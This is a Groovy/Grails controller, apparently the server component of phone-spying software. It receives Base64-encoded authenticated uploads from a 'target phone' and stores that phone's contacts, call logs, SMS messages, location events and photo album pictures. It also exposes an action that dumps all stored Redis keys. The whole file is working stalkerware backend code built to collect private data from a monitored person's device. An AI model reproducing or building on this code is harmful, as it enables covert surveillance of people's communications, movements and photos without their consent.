package com.xaviar

import static org.springframework.web.bind.annotation.RequestMethod.POST

import org.apache.commons.codec.binary.Base64
import org.codehaus.jackson.JsonParseException
import org.codehaus.jackson.map.JsonMappingException

import redis.clients.jedis.Jedis

import com.xaviar.domain.TargetPhone
import com.xaviar.domain.User
import com.xaviar.market.rest.item.DataHolder


//main class for retrieving target phons data
class SpyController {

	def redisService;
	def spyAuthService;
	def targetPhoneService

	//get data from target phones and add it to the DB
	def createdata(DataHolder dataHolder) {

		try{
			//get flower data for auth and target
			String clientFlower = dataHolder.get(DataHolder.FLOWER);

			// validate clientFlower data exists
			if(clientFlower!=null && !clientFlower.isEmpty()){

				// decode flower data before use
				clientFlower = new String(Base64.decodeBase64(clientFlower.getBytes()));

				//auth user
				if(spyAuthService.authTargetRequest(clientFlower)){ //user is authenticated

					//auth data
					String authSimSubscriberId = spyAuthService.getSimSubscriberId(clientFlower);
					User authUser =  spyAuthService.getUser(clientFlower);

					//Redis testing data
					//addAllToRedis(dataHolder)

					TargetPhone targetPhone = TargetPhone.findBySimSubscriberId(authSimSubscriberId);

					//target phone parameters
					targetPhoneService.addPhoneParams(dataHolder, authSimSubscriberId,authUser)

					//target phone contacts
					targetPhoneService.addContacts(dataHolder, targetPhone)

					//target phone call logs
					targetPhoneService.addCallLogs(dataHolder, targetPhone)

					//target phone call log events
					targetPhoneService.addCallLogEvents(dataHolder, targetPhone)

					//target phone location events
					targetPhoneService.addLocationEvents(dataHolder, targetPhone)

					//target phone smses
					targetPhoneService.addSmses(dataHolder, targetPhone)

					//target phone sms events
					targetPhoneService.addSmsEvents(dataHolder, targetPhone)

					//target phone album pictures
					targetPhoneService.addPictures(dataHolder, targetPhone)

					//send ok message to phone
					dataHolder.setID(200);
					[dataHolder:dataHolder]
				}
			}
		} catch (JsonParseException e) {
			e.printStackTrace();
			return new DataHolder().setID(-2);
		} catch (JsonMappingException e) {
			e.printStackTrace();
			return new DataHolder().setID(-3);
		} catch (IOException e) {
			e.printStackTrace();
			return new DataHolder().setID(-4);
		}catch(Exception e){
			e.printStackTrace();
			return new DataHolder().setID(-1);
		}finally{

		}
	}

	private addAllToRedis(DataHolder dataHolder) {
		Iterator<Map.Entry<String, String>> iterator = dataHolder.map.entrySet().iterator();
		while (iterator.hasNext()) {
			Map.Entry<String, String> mapEntry = (Map.Entry<String, String>) iterator
					.next();
			Jedis jedis = new Jedis("localhost");
			jedis.set("GENERIC_" + mapEntry.getKey().toString(), mapEntry.getValue()
					.toString());
		}
	}


	def getdata ={

		def DataHolder dataholder = new DataHolder();
		def Map<String, String> map = dataholder.getMap();
		def keys = redisService.withRedis { Jedis redis ->
			redis.keys("*");
		}

		for (key in keys) {
			def jsonData = redisService.withRedis { Jedis redis ->
				redis.get(key.toString());
			}

			if(jsonData!=null){
				map.put(key, jsonData);
			}
		}

		// print out data as json for test in the browser
		// render(contentType: 'text/json') {[dataholder:dataholder]}
		// also set urimappings.groovy action of getdata to GET :
		// action = [GET: "getdata"]

		[dataholder:dataholder]
	}
}
